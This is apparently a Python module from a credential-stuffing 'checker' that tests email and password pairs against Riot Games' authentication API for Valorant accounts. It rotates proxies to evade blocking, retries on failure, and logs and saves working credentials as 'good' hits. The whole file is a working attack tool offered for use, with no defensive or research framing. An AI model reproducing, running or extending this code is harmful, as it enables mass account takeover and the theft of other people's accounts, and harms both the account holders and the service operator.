from __main__ import checker
from requests import Session
from modules.functions import bad_proxy, log,save,set_proxy

def check(email:str,password:str):
    if "@" in email:
        username = email.split("@")[0]
    retries = 0
    while retries != checker.retries:
        proxy = set_proxy()
        headers = {
            "Host": "auth.riotgames.com" ,
            "user-agent": "RiotClient/30.0.1.3715678.3712489 rso-auth (Windows;10;;Professional, x64)" ,
            "Cache-Control": "no-cache" ,
            "Accept": "application/json" ,
            "Accept-Encoding": "gzip, deflate" 
        }
        data_1 = {"acr_values":"urn:riot:bronze","claims":"","client_id":"riot-client","nonce":"ih0ckcv8kNAghtFLBfyAwQ","redirect_uri":"http://localhost/redirect","response_type":"token id_token","scope":"openid link ban lol_region"}
        data_2 = {"language":"en_US","password":password,"region":None,"remember":False,"type":"auth","username":username}
        try:
            with Session() as s:
                s.post("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_1,proxies=set_proxy(proxy),timeout=checker.timeout)
                response = s.put("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_2,proxies=set_proxy(proxy),timeout=checker.timeout).text
                if "auth_failure" in response:
                    retries += 1
                elif "access_token" in response:
                    if not checker.cui:
                        log("good",username+":"+password,"Valorant")
                    save("Valorant","good",checker.time,username+":"+password+f" | Email: {email}")
                    checker.good += 1
                    checker.cpm += 1
                    return
                else:
                    raise
        except:
            bad_proxy(proxy)
            checker.errors += 1
    if not checker.cui:
        log("bad",username+":"+password,"Valorant")
    checker.bad += 1
    checker.cpm += 1
    return